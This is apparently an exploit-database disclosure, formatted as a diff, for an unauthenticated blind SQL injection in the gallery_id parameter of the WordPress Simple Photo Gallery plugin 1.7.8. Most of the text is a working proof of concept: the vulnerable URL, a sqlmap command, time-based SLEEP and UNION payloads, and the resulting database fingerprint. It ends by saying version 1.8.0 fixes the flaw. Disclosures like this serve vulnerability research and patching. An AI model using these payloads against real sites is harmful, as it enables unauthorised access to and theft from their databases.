@@ -1,0 +1,55 @@
+# Exploit Title: Wordpess Simple Photo Gallery Blind SQL Injection
+# Date: 12-05-2015
+# Exploit Author: woodspeed
+# Vendor Homepage: https://wordpress.org/plugins/simple-photo-gallery/
+# Version: 1.7.8
+# Tested on: Apache 2.2.22, PHP 5.3.10
+# OSVDB ID : http://www.osvdb.org/show/osvdb/122374
+# WPVULNDB ID : https://wpvulndb.com/vulnerabilities/8000
+# Category: webapps
+
+1. Description
+
+Unauthenticated Blind SQL Injection via gallery_id field.
+
+2. Proof of Concept
+
+http://localhost/wordpress/index.php/wppg_photogallery/wppg_photo_details/?gallery_id=1&image_id=14
+
+
+./sqlmap.py --dbms=MYSQL --technique T -u http://localhost/wordpress/index.php/wppg_photogallery/wppg_photo_details/?gallery_id=1&image_id=14  
+
+sqlmap identified the following injection points with a total of 60 HTTP(s) requests:
+---
+
+    Parameter: gallery_id (GET)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)
+    Payload: gallery_id=1 AND (SELECT * FROM (SELECT(SLEEP(5)))QBzh)
+
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 1 column
+    Payload: gallery_id=1 UNION ALL SELECT CONCAT(0x7176787071,0x76576b586376794b756d,0x71707a7171)--
+---
+
+web server operating system: Linux Ubuntu 13.04 or 12.04 or 12.10 (Raring Ringtail or Precise Pangolin or Quantal Quetzal)
+
+web application technology: Apache 2.2.22, PHP 5.3.10
+
+back-end DBMS operating system: Linux Ubuntu
+
+back-end DBMS: MySQL 5.0.12
+
+banner:    '5.5.43-0ubuntu0.12.04.1'
+
+current user:    'wordpress@localhost'
+
+current database:    'wordpress'
+
+---
+
+3. Solution
+
+Fixed in version 1.8.0
